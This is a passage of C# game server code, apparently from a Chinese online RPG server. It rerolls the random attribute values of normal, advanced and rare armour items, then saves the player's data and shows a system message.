						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠内甲高级属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠内甲高级属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠内甲稀有属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠内甲稀有属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
